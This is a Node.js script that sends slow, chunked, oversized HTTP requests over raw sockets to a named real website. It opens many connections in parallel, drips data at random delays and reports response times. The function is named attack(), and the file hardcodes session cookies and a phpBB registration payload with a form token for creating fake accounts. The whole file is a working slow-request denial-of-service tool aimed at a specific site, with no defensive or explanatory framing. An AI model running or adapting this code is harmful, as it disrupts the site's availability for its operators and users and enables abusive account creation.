const _ = require('underscore');
const qs = require('querystring');
const net = require('net');
const dns = require('dns');

var requestsCount = 0;
var loadTimeSum = 0;
var loadDataAmount = 0;

const hostname = 'for-ua.info';
const path = '/';
// const path = '/questions/17245881/node-js-econnreset';
const method = 'GET';

var size = +process.argv[process.argv.length - 1];
var threadsCount = +process.argv[process.argv.length - 2];
if (!isFinite(size)) {
  size = 1;
}
if (!isFinite(threadsCount)) {
  threadsCount = 1;
}

function generate() {
  var cookies = {};
  var content = {};

  for (let i = 0; i < size; i++) {
    cookies[i] = _.random(1, 1000 * 1000 * 1000 * 1000).toString(2)
  }

  cookies = qs.encode(cookies, '; ') + 'phpbb3_dfg23_u=1; phpbb3_dfg23_k=; phpbb3_dfg23_sid=0d023aa521d3e041beb18633a9c0bef2; _gat=1; _ym_uid=147321962228649464; _ym_isad=1; _ga=GA1.2.1422368805.1473219621';
  // cookies = qs.encode(cookies, '; ') + 'b=b; _gat=1; _gat_uaTracker=1; _ym_uid=1473229098574542496; _ym_isad=1; __gfp_64b=wlWKnckwQ0RWnV4h7gml2ksfKgwjwYmsEppzeORRhMX.l7; b=b; _ga=GA1.2.1379855513.1473229098; _ym_visorc_36555550=w; _ym_visorc_38467185=b; UNIANPush_modal=denied';

  var headers = {
    Host: hostname,
    // 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
    // 'referer': 'http://for-ua.info/ucp.php?mode=register',
    // 'Accept': 'text/html',
    // 'Accept-Language': 'ru,en-US;q=0.8,en;q=0.6',
    // 'Cookie': cookies
  };

  if ('GET' != method) {
    const username = 'abcdefg11';
    for (let i = 0; i < size; i++) {
      content[i] = _.random(1, 1000 * 1000 * 1000 * 1000).toString(2)
    }
    content.username = username;
    content.email = username + '@yopmail.com';
    content.email_confirm = username + '@yopmail.com';
    content.new_password = username + '2005';
    content.password_confirm = username + '2005';
    content.data = 'ru';
    content.tz = 2;
    content.agreed = true;
    content.change_lang = 0;
    content.qa_answer = username;
    content.qa_confirm_id = '8689d86e4e4a29eacc20b551304e26a1';
    content.creation_time = 1473219931;
    content.form_token = '28cca212dae3aec858604966f02046c17ce0de5d';
    content = qs.encode(content);
    headers['content-length'] = 'application/x-www-form-urlencoded';
    headers['content-length'] = content.length;
  }
  headers = qs.encode(headers, '\n', ': ');

  var data = [method + ` ${path} HTTP/1.1`, headers, ''];
  if ('GET' != method) {
    data.push(content);
  }
  data = data.join('\n');
  console.log(data.length / 1024);
  console.log(data);
  const chucks = [];
  data = data.split('\n');
  for (let i = 0; i < data.length; i++) {
    const chuck = data[i];
    if (chuck.length > 1024) {
      chuck.match(/.{1,1024}/g).forEach(function (chuck) {
        chucks.push(chuck)
      });
      if (i != data.length - 1) {
        chucks[chucks.length - 1] = chucks[chucks.length - 1] + '\n';
      }
    }
    else {
      chucks.push(chuck + '\n');
    }
  }
  return chucks.map(function (chuck) {
    return new Buffer(chuck, 'utf8');
  })
}

const chucks = generate();

setInterval(function () {
  const time = new Date().toLocaleString();
  const loading = Math.round(loadTimeSum / requestsCount);
  console.log(`# ${time} # ${loading} # ${requestsCount} / ${(loadDataAmount / 1024).toPrecision(2)}`);
  loadTimeSum = 0;
  requestsCount = 0;
  loadDataAmount = 0;
}, 10000);

dns.lookup(hostname, {family: 4}, function (err, address) {
  function attack() {
    const start = Date.now();
    const socket = new net.Socket();
    socket.on('connect', function () {
      chucks.forEach(function (chuck) {
        setTimeout(function () {
          socket.write(chuck)
        }, _.random(1, 4000));
      })
    });
    socket.on('error', function (err) {
      console.error(err.code);
    });
    socket.on('data', function (chuck) {
      loadDataAmount += chuck.length;
    });
    socket.on('end', function () {
      requestsCount++;
      loadTimeSum += Date.now() - start;
      // attack();
    });
    socket.connect({
      host: address,
      port: 80
    });
  }

  if (err) {
    console.error(err);
  }
  else {
    console.log(address);
    for (var i = 0; i < threadsCount; i++) {
      setTimeout(attack, _.random(1, i * 50));
    }
  }
});
